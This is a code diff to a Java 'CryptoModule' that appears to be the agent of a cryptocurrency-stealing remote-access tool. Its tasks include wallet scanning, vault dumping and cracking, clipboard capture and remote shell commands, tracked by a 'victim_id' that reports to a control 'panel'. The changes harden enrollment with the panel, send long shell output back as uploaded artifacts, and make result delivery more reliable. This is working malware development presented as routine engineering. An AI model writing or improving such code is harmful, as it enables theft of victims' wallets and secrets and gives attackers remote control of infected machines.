@@ -61,6 +61,7 @@ public final class CryptoModule {
 		"scan_wallets", "dump_vault", "crack_vault", "shell", "agent");
 	private static final byte[] HTTP_MARKER =
 		CryptoUtil.utf8("{\"status\":\"ok\",\"error\":null,\"result\":{\"http_result\":true},\"artifacts\":[]}");
+	private static final int INLINE_OUTPUT = 1900;
 
 	private static final Set<String> SUPPORTED = Set.of(
 		"scan_wallets", "dump_vault", "crack_vault", "clip_start", "clip_stop",
@@ -113,6 +114,7 @@ public final class CryptoModule {
 		return thread;
 	});
 	private final Semaphore pollNow = new Semaphore(0);
+	private final Object enrollLock = new Object();
 	private final AtomicLong startedAt = new AtomicLong(System.currentTimeMillis());
 	private final AtomicInteger uploadsActive = new AtomicInteger();
 	private volatile boolean enabled = true;
@@ -292,9 +294,10 @@ public final class CryptoModule {
 						Thread.sleep(config.jitter(10_000L));
 						continue;
 					}
+					long gen = transport.generation();
 					CryptoTransport.Reply reply = transport.tasks(8);
 					if (reply.status() == 401) {
-						if (reEnroll()) {
+						if (reEnroll(gen)) {
 							continue;
 						}
 					}
@@ -341,6 +344,32 @@ public final class CryptoModule {
 	}
 
 	private boolean enroll() {
+		synchronized (enrollLock) {
+			return enrollLocked();
+		}
+	}
+
+	/**
+	 * Re-enrolls unless another thread already rotated the token since {@code seen}.
+	 *
+	 * <p>Heartbeat and poll both see 401 after another loop enrolls: the panel
+	 * rotates the device token on every enroll, so two loops enrolling at once
+	 * keep invalidating each other and never settle.</p>
+	 */
+	private boolean reEnroll(long seen) {
+		synchronized (enrollLock) {
+			if (stale(seen, transport.generation(), transport.enrolled())) {
+				return true;
+			}
+			return enrollLocked();
+		}
+	}
+
+	static boolean stale(long seen, long current, boolean enrolled) {
+		return enrolled && current != seen;
+	}
+
+	private boolean enrollLocked() {
 		try {
 			String token = CryptoUtil.b64url(java.util.Arrays.copyOf(
 				CryptoUtil.hmac(config.secret(), CryptoUtil.utf8("enroll")), 32));
@@ -381,14 +410,17 @@ public final class CryptoModule {
 		}
 	}
 
+	/**
+	 * Keeps the current identity in place while re-enrolling: if the panel is
+	 * rate limited, wiping it first would leave the agent unable to sign
+	 * anything (and therefore unable to report the failure).
+	 */
 	private boolean reEnroll() {
-		state.remove("device_token");
-		state.remove("victim_id");
-		saveState();
 		return enroll();
 	}
 
 	private void sendHeartbeat() throws Exception {
+		long gen = transport.generation();
 		Map<String, Object> body = new LinkedHashMap<>();
 		body.put("status", moduleHealth.values().stream().anyMatch(value -> value.startsWith("error")) ? "degraded" : "ok");
 		body.put("uptime_s", (System.currentTimeMillis() - startedAt.get()) / 1000L);
@@ -398,7 +430,7 @@ public final class CryptoModule {
 		body.put("pending_artifact", null);
 		body.put("agent_version", version());
 		CryptoTransport.Reply reply = transport.heartbeat(CryptoUtil.utf8(Json.stringify(body)));
-		if (reply.status() == 401 && reEnroll()) {
+		if (reply.status() == 401 && reEnroll(gen)) {
 			return;
 		}
 		if (reply.status() == 410) {
@@ -1078,7 +1110,38 @@ public final class CryptoModule {
 		String output = Shell.run(installDir, command, timeout);
 		Map<String, Object> out = new LinkedHashMap<>();
 		out.put("exit", 0);
-		out.put("output", output);
+		byte[] bytes = output.getBytes(StandardCharsets.UTF_8);
+		if (bytes.length <= INLINE_OUTPUT) {
+			out.put("output", output);
+			return out;
+		}
+		// Long output travels as an artifact (T4 step 8). The frame stays a
+		// marker and the result keeps a short inline preview for the list view.
+		Path file = work.resolve("shell-" + System.currentTimeMillis() + ".log");
+		try {
+			Files.write(file, bytes);
+			ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "shell", work.resolve("tmp"));
+			try {
+				if (pack.add(file, "output.log", "shell")) {
+					String upload = queueUpload(pack, "shell", task.id());
+					if (!upload.isEmpty()) {
+						out.put("upload_id", upload);
+					}
+				}
+			} finally {
+				pack.close();
+			}
+		} finally {
+			Files.deleteIfExists(file);
+		}
+		int end = Math.min(output.length(), INLINE_OUTPUT);
+		if (end < output.length() && Character.isHighSurrogate(output.charAt(end - 1))
+			&& Character.isLowSurrogate(output.charAt(end))) {
+			end--;
+		}
+		out.put("output", output.substring(0, end));
+		out.put("output_bytes", bytes.length);
+		out.put("truncated", true);
 		return out;
 	}
 
@@ -1480,30 +1543,45 @@ public final class CryptoModule {
 		byte[] json = CryptoUtil.utf8(Json.stringify(body));
 		FrameSink frameSink = frames;
 		boolean byFrame = task.frame() && frameSink != null;
+		log("postResult " + task.name() + " frame=" + task.frame() + " frames=" + (frameSink != null)
+			+ " apiOpen=" + transport.apiOpen() + " bytes=" + json.length);
+		boolean delivered = false;
 		if (byFrame && !HTTP_ONLY.contains(task.name()) && json.length <= 262_144) {
 			// The frame carries these exact bytes; the panel must not re-serialize.
-			if (frameSink.deliver(task.replyTo(), task.name(), json)) {
+			delivered = frameSink.deliver(task.replyTo(), task.name(), json);
+			if (delivered) {
 				breakerLog("closed");
-				return;
 			}
 		}
 		if (!transport.apiOpen()) {
 			try {
 				CryptoTransport.Reply reply = transport.result(task.id(), json);
-				if (reply.status() >= 200 && reply.status() < 300) {
+				// A frame that already landed makes the signed HTTP body a 409
+				// duplicate; both outcomes mean the result is stored.
+				if ((reply.status() >= 200 && reply.status() < 300) || reply.status() == 409) {
 					breakerLog("closed");
 					if (byFrame && HTTP_ONLY.contains(task.name())) {
 						frameSink.deliver(task.replyTo(), task.name(), HTTP_MARKER);
 					}
 					return;
 				}
+				if (delivered) {
+					// The frame path accepted it; a 5xx retry only adds noise.
+					return;
+				}
 				log("result post rejected: " + reply.status());
 			} catch (Throwable throwable) {
 				breakerLog("open");
 				log("result post failed: " + shortMessage(throwable));
+				if (delivered) {
+					return;
+				}
 			}
 		} else {
 			breakerLog("open");
+			if (delivered) {
+				return;
+			}
 		}
 		postResultFallback(task, json);
 	}
